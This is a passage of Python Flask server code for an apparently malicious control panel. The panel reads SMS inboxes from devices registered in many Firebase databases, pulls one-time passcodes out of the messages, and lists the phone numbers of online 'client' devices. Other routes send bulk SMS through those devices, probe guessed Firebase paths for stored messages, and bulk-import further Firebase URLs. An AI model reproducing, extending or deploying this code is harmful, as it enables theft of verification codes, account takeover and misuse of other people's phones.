    return jsonify({"success": False, "error": "Failed to save"}), 500


@app.route("/api/refresh", methods=["POST"])
@login_required
def api_refresh():
    ok = refresh_cache(force=True)
    return jsonify({"success": ok, "refreshed": cache["last_update"] > 0})


@app.route("/api/numbers")
@login_required
def api_numbers():
    with cache["lock"]:
        nums = list(cache["numbers_map"].values())
        stats = dict(cache["stats"])
        loading = cache["loading"]
        last = cache["last_update"]
    fb_total = 0
    if MONGO_OK:
        try:
            fb_total = fb_collection.count_documents({})
        except Exception:
            fb_total = 0
    return jsonify({
        "success": True,
        "numbers": nums,
        "total": stats.get("total", 0),
        "online": stats.get("online", 0),
        "offline": stats.get("offline", 0),
        "otp_rate": stats.get("otp_rate", 0),
        "loading": loading,
        "firebases_total": fb_total,
        "last_update": last,
    })


@app.route("/api/inbox")
@login_required
def api_inbox():
    try:
        fb_url = request.args.get("fb", "").strip()
        dev_id = request.args.get("id", "").strip()
        num = request.args.get("num", "").strip()
        if not fb_url or not dev_id or not num:
            return jsonify({"success": False, "error": "fb, id, num required"}), 400
        key = f"{fb_url}|{dev_id}|{num}"
        now = time.time()
        with cache["lock"]:
            cached = cache["device_messages"].get(key)
            cached_at = cache["msg_cache_time"].get(key, 0)
            inbox_lock = cache["inbox_locks"].setdefault(key, threading.Lock())
        if cached and (now - cached_at) < MESSAGE_CACHE_TTL:
            return jsonify({"success": True, "messages": cached[:MAX_SMS_PER_NUMBER], "cached": True})
        with inbox_lock:
            with cache["lock"]:
                cached = cache["device_messages"].get(key)
                cached_at = cache["msg_cache_time"].get(key, 0)
            if cached and (time.time() - cached_at) < MESSAGE_CACHE_TTL:
                return jsonify({"success": True, "messages": cached[:MAX_SMS_PER_NUMBER], "cached": True})
            msgs = fetch_messages_multi_path(fb_url, dev_id, phone_numbers=[num])
            received = [m for m in msgs if m.get("type") == "received"]
            matched = received if received else msgs
            matched = sorted(matched, key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
            for m in matched:
                m["otp"] = extract_otp(m.get("message", ""))
            matched = matched[:MAX_SMS_PER_NUMBER]
            with cache["lock"]:
                cache["device_messages"][key] = matched
                cache["msg_cache_time"][key] = time.time()
        return jsonify({"success": True, "messages": matched, "cached": False})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/sms/send", methods=["POST"])
@login_required
def api_sms_send():
    if not get_sms_sender_enabled():
        return jsonify({"success": False, "error": "SMS Sender disabled by admin"}), 403
    try:
        data = request.get_json() or {}
        target = (data.get("target") or "").strip()
        message = (data.get("message") or "").strip()
        count = max(1, min(int(data.get("count", 1)), MAX_SMS_BULK))
        if not target or not message:
            return jsonify({"success": False, "error": "Target and message required"}), 400
        device_id = (data.get("device_id") or "").strip()
        fb_url = (data.get("firebase") or "").strip()
        if not device_id or not fb_url:
            with cache["lock"]:
                for _, dev in cache["numbers_map"].items():
                    if dev.get("online"):
                        device_id = dev["device_id"]
                        fb_url = dev["firebase"]
                        break
        if not device_id or not fb_url:
            return jsonify({"success": False, "error": "No online device available"}), 404
        results = []
        success_count = 0
        for _ in range(count):
            r = send_sms_via_device(fb_url, device_id, target, message)
            results.append(r)
            if r.get("success"):
                success_count += 1
            time.sleep(0.3)
        if MONGO_OK:
            try:
                sms_logs_collection.insert_one({
                    "target": target,
                    "message": message,
                    "count": count,
                    "device_id": device_id,
                    "firebase": fb_url,
                    "timestamp": int(time.time()),
                    "ip": request.remote_addr or "?",
                    "success": success_count,
                    "role": session.get("role", "user"),
                })
            except Exception:
                pass
        return jsonify({
            "success": success_count > 0,
            "sent": success_count,
            "requested": count,
            "results": results,
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/logs")
@admin_required
def api_logs():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        docs = list(sms_logs_collection.find({}).sort("timestamp", -1).limit(100))
        for d in docs:
            d["_id"] = str(d["_id"])
        return jsonify({"success": True, "logs": docs})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/otp/add", methods=["POST"])
@login_required
def api_otp_add():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        data = request.get_json() or {}
        url = (data.get("url") or "").strip().rstrip("/")
        if url and not url.startswith("http"):
            url = "https://" + url
        if not url or "firebase" not in url:
            return jsonify({"success": False, "error": "Invalid firebase URL"}), 400
        if fb_collection.find_one({"url": url}):
            return jsonify({"success": True, "message": "Already added", "hash": fb_hash(url)})
        name = url.replace("https://", "").split(".")[0][:30]
        fb_collection.insert_one({
            "url": url, "name": name,
            "added_at": int(time.time()),
            "source": "personal_otp",
        })
        return jsonify({"success": True, "hash": fb_hash(url)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/otp/data", methods=["POST"])
@login_required
def api_otp_data():
    try:
        data = request.get_json() or {}
        urls = data.get("urls", [])
        if not isinstance(urls, list) or not urls:
            return jsonify({"success": False, "error": "No firebase URLs provided"}), 400
        cap = MAX_OTP_URLS_VERCEL if IS_VERCEL else MAX_OTP_URLS_LOCAL
        all_numbers, total_otp, total_msg = [], 0, 0
        for url in urls[:cap]:
            try:
                devices = fetch_devices_from_one_fb(url, "user_fb", "")
                for dev in devices:
                    is_on = dev.get("online", False)
                    for sim in dev.get("sims", []):
                        num = sim["number"]
                        msgs = dev.get("per_number", {}).get(num, [])
                        otp_count = sum(1 for m in msgs if extract_otp(m.get("message", "")))
                        total_otp += otp_count
                        total_msg += len(msgs)
                        all_numbers.append({
                            "number": num,
                            "device_id": dev["id"],
                            "device_name": dev.get("name", ""),
                            "firebase": url,
                            "online": is_on,
                            "msg_count": len(msgs),
                            "otp_count": otp_count,
                            "confidence": sim.get("confidence", 0),
                        })
            except Exception as e:
                print(f"otp data err: {e}")
                continue
        seen, unique = set(), []
        for n in all_numbers:
            if n["number"] in seen:
                continue
            seen.add(n["number"])
            unique.append(n)
        return jsonify({
            "success": True,
            "numbers": unique,
            "total": len(unique),
            "online": sum(1 for n in unique if n.get("online")),
            "offline": sum(1 for n in unique if not n.get("online")),
            "otp_rate": int((total_otp / total_msg) * 100) if total_msg > 0 else 0,
            "capped_at": cap,
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/rawdata")
@admin_required
def api_rawdata():
    fb_url = request.args.get("fb", "").strip()
    dev_id = request.args.get("id", "").strip()
    if not fb_url or not dev_id:
        return jsonify({"success": False, "error": "fb and id required"}), 400
    base = fb_url.rstrip("/")
    paths = [
        f'/messages/{dev_id}.json?orderBy="$key"&limitToLast=60',
        f"/messages/{dev_id}.json",
        f"/clients/{dev_id}.json",
        f"/clients/{dev_id}/messages.json",
        f"/clients/{dev_id}/sms.json",
        f"/clients/{dev_id}/inbox.json",
        f"/clients/{dev_id}/receivedSms.json",
        f"/clients/{dev_id}/received.json",
        f"/clients/{dev_id}/incoming.json",
        f"/clients/{dev_id}/sms_history.json",
        f"/clients/{dev_id}/history.json",
        f"/clients/{dev_id}/logs.json",
        f"/inbox/{dev_id}.json",
        f"/received/{dev_id}.json",
        f"/sms/{dev_id}.json",
        "/clients.json?shallow=true",
    ]
    results, found = [], 0
    for p in paths:
        data = try_json(base + p, timeout=6)
        item = {"path": p, "data": None, "message_count": 0, "status": "not_found"}
        if data is None:
            item["status"] = "empty"
        else:
            item["data"] = data
            item["message_count"] = len(collect_all_messages(data))
            item["status"] = "has_data"
            found += 1
        results.append(item)
    return jsonify({"success": True, "scanned": len(paths), "found": found, "results": results})


@app.route("/api/security/change", methods=["POST"])
@admin_required
def api_security_change():
    data = request.get_json() or {}
    role = data.get("role", "").strip()
    pwd = data.get("password", "").strip()
    if role not in ("user", "admin"):
        return jsonify({"success": False, "error": "Invalid role"}), 400
    if not pwd or len(pwd) < 4:
        return jsonify({"success": False, "error": "Password too short"}), 400
    if set_pwd(role, pwd):
        return jsonify({"success": True})
    return jsonify({"success": False, "error": "Failed to save"}), 500


@app.route("/api/firebases", methods=["GET"])
@admin_required
def api_fb_list():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        docs = list(fb_collection.find({}).sort("added_at", -1))
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500
    with cache["lock"]:
        fb_stats = dict(cache["fb_stats"]) if cache["fb_stats"] else {}
    out = []
    for d in docs:
        fb_id = str(d["_id"])
        out.append({
            "id": fb_id,
            "name": d.get("name", ""),
            "hash": fb_hash(d.get("url", "")),
            "added_at": d.get("added_at", 0),
            "source": d.get("source", "admin"),
            "stats": fb_stats.get(fb_id, {"online": 0, "offline": 0, "devices": 0}),
        })
    return jsonify({"success": True, "firebases": out, "count": len(out)})


@app.route("/api/firebase/<fb_id>", methods=["GET"])
@admin_required
def api_fb_view(fb_id):
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        doc = fb_collection.find_one({"_id": ObjectId(fb_id)})
    except Exception:
        return jsonify({"success": False, "error": "Invalid id"}), 400
    if not doc:
        return jsonify({"success": False, "error": "Not found"}), 404
    fb_url = doc.get("url", "")
    devices = fetch_devices_from_one_fb(fb_url, doc.get("name", ""), fb_id)
    numbers, otp_total, online_count, offline_count = [], 0, 0, 0
    for dev in devices:
        is_on = dev.get("online", False)
        if is_on:
            online_count += 1
        else:
            offline_count += 1
        for sim in dev.get("sims", []):
            num = sim["number"]
            msgs = dev.get("per_number", {}).get(num, [])
            otp_count = sum(1 for m in msgs if extract_otp(m.get("message", "")))
            otp_total += otp_count
            numbers.append({
                "number": num,
                "device_id": dev["id"],
                "device_name": dev.get("name", ""),
                "firebase": fb_url,
                "online": is_on,
                "msg_count": len(msgs),
                "otp_count": otp_count,
            })
    return jsonify({
        "success": True,
        "id": fb_id,
        "name": doc.get("name", ""),
        "hash": fb_hash(fb_url),
        "device_count": len(devices),
        "online_count": online_count,
        "offline_count": offline_count,
        "number_count": len(numbers),
        "otp_count": otp_total,
        "numbers": numbers,
    })


@app.route("/api/firebases", methods=["POST"])
@admin_required
def api_fb_add():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    data = request.get_json() or {}
    url = (data.get("url") or "").strip().rstrip("/")
    if url and not url.startswith("http"):
        url = "https://" + url
    if not url or "firebase" not in url:
        return jsonify({"success": False, "error": "Invalid firebase URL"}), 400
    if fb_collection.find_one({"url": url}):
        return jsonify({"success": False, "error": "Already added"}), 409
    name = url.replace("https://", "").split(".")[0][:30]
    fb_collection.insert_one({
        "url": url, "name": name,
        "added_at": int(time.time()),
        "source": "admin",
    })
    return jsonify({"success": True})


@app.route("/api/firebases/bulk", methods=["POST"])
@admin_required
def api_fb_bulk():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    data = request.get_json() or {}
    urls = data.get("urls", [])
    added, skipped = 0, 0
    for u in urls:
        url = (u or "").strip().rstrip("/")
        if url and not url.startswith("http"):
            url = "https://" + url
        if not url or "firebase" not in url:
            continue
        if fb_collection.find_one({"url": url}):
            skipped += 1
            continue
        name = url.replace("https://", "").split(".")[0][:30]
        fb_collection.insert_one({
            "url": url, "name": name,
            "added_at": int(time.time()),
            "source": "admin_bulk",
        })
        added += 1
    return jsonify({"success": True, "added": added, "skipped": skipped})


@app.route("/api/firebases/<fb_id>", methods=["DELETE"])
@admin_required
def api_fb_delete(fb_id):
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        res = fb_collection.delete_one({"_id": ObjectId(fb_id)})
        if res.deleted_count == 0:
            return jsonify({"success": False, "error": "Not found"}), 404
        with cache["lock"]:
            cache["numbers_map"] = {}
            cache["devices"] = {}
            cache["device_messages"] = {}
            cache["msg_cache_time"] = {}
            cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
            cache["fb_stats"] = {}
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 400


@app.route("/api/firebases/bulk-delete", methods=["POST"])
@admin_required
def api_fb_bulk_delete():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    data = request.get_json() or {}
    ids = data.get("ids", [])
    deleted = 0
    for i in ids:
        try:
            res = fb_collection.delete_one({"_id": ObjectId(i)})
            deleted += res.deleted_count
        except Exception:
            pass
    with cache["lock"]:
        cache["numbers_map"] = {}
        cache["devices"] = {}
        cache["device_messages"] = {}
        cache["msg_cache_time"] = {}
        cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
        cache["fb_stats"] = {}
    return jsonify({"success": True, "deleted": deleted})


@app.route("/api/firebases/all", methods=["DELETE"])
@admin_required
def api_fb_delete_all():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        res = fb_collection.delete_many({})
        with cache["lock"]:
            cache["numbers_map"] = {}
            cache["devices"] = {}
            cache["device_messages"] = {}
            cache["msg_cache_time"] = {}
            cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
            cache["fb_stats"] = {}
        return jsonify({"success": True, "deleted": res.deleted_count})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
